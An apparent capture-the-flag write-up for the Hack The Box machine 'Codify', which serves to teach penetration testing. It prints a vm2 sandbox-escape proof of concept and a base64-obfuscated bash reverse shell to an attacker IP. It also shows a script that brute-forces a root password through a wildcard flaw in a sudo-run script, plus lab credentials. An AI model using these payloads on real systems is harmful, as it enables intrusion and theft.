# Codify
## Enumeration:

Start off with an NMAP scan:
```bash
$ nmap -A -Pn -v -p- --min-rate=1000 10.10.11.239

Nmap scan report for codify.htb (10.10.11.239)
Host is up (0.20s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-title: Codify
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
3000/tcp open  http    Node.js Express framework
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Codify
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Looking at the WebApp, it is a Node.js sandbox environment to run and test javascript code. There are 2 main endpoints:
- /editor - Actual code editor
- /limitations - talks about the modules whitelisted and the ones blacklisted
- /about - talks about Codify and the technology used behind it, specifically `vm2 version 3.9.16`

## Exploit:

Looking for vulnerabilities in `vm2`, we come across the following: [CVE-2023-32314](https://security.snyk.io/vuln/SNYK-JS-VM2-5537100)

The link also provides a POC which can be used to bypass the sandbox and get RCE:
```js
const { VM } = require("vm2");
const vm = new VM();

const code = `
  const err = new Error();
  err.name = {
    toString: new Proxy(() => "", {
      apply(target, thiz, args) {
        const process = args.constructor.constructor("return process")();
        throw process.mainModule.require("child_process").execSync("echo hacked").toString();
      },
    }),
  };
  try {
    err.stack;
  } catch (stdout) {
    stdout;
  }
`;

console.log(vm.run(code)); // -> hacked
```

We can replace the `echo hacked` with any code to perform RCE. (Personally I use the following payload which is just base64 reverse shell being piped to bash: `echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yMS85MDAwIDA+JjEK | base64 -d | bash`)

We get onto the system as the user `svc`. Looking around, we find `/var/html/contact/tickets.db` which is simply an SQLite3 database file which contains a table called `users` having the brypt hash for the joshua user.

`joshua:$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2:spongebob1`

With joshua's password, we can SSH and find the user flag.

User flag is in `/home/joshua/user.txt`

## Priv-Esc:

Running `sudo -l` will give the following output:
```bash
joshua@codify:~$ sudo -l
[sudo] password for joshua: 
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
```

We can run `/opt/scripts/mysql-backup.sh` as root. Looking at the script file, we see the following:
```bash
#!/bin/bash
DB_USER="root"
DB_PASS=$(/usr/bin/cat /root/.creds)
BACKUP_DIR="/var/backups/mysql"

read -s -p "Enter MySQL password for $DB_USER: " USER_PASS
/usr/bin/echo

if [[ $DB_PASS == $USER_PASS ]]; then
        /usr/bin/echo "Password confirmed!"
else
        /usr/bin/echo "Password confirmation failed!"
        exit 1
fi

/usr/bin/mkdir -p "$BACKUP_DIR"

databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")

for db in $databases; do
    /usr/bin/echo "Backing up database: $db"
    /usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"
done

/usr/bin/echo "All databases backed up successfully!"
/usr/bin/echo "Changing the permissions"
/usr/bin/chown root:sys-adm "$BACKUP_DIR"
/usr/bin/chmod 774 -R "$BACKUP_DIR"
/usr/bin/echo 'Done!'
```

The script checks the root password, stored in `/root/.creds` with the root password we provide as user input and then uses it to log into mysql, dump the databases and get a backup of them.

The problem comes with the way the comparison between the user input and the stored credential happens. In bash, when it comes to `==`, we can use the `*` wildcard character to match anything as true. We can use this to bruteforce the password by running a character set against the wildcard to determine which characters are valid. This works by simply running input like `a*` or `b*` or `aa*` till the condition evaluates to true. I made a python script to automate the above and return the password:

```python
import subprocess
import string

guess = ''

def brute(guess):
    charset = string.ascii_letters + string.digits + '-+/=\n'
    # Define the command to run
    command = "sudo /opt/scripts/mysql-backup.sh"
    
    # Define LOOP
    LOOP = True
    
    while LOOP:
        c = None
        for c in charset:
            # Start a new subprocess for each attempt
            process = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            password = guess + c + "*\n"
            process.stdin.write(password)
            process.stdin.flush()
            
            # Read the output from the process
            output, errors = process.communicate()
            if "Password confirmed!" in output:
                guess += c
                print(guess,end="\r")
                break
        if c == '\n':
            LOOP = False
    
    return guess

result = brute(guess)
print('Result is ' + result)
```

This reveals the following credentials:
`root:kljh12k3jhaskjh12kjh3`

We can use this to `su` as root and get the root flag.
Root flag can be found in `/root/root.txt`
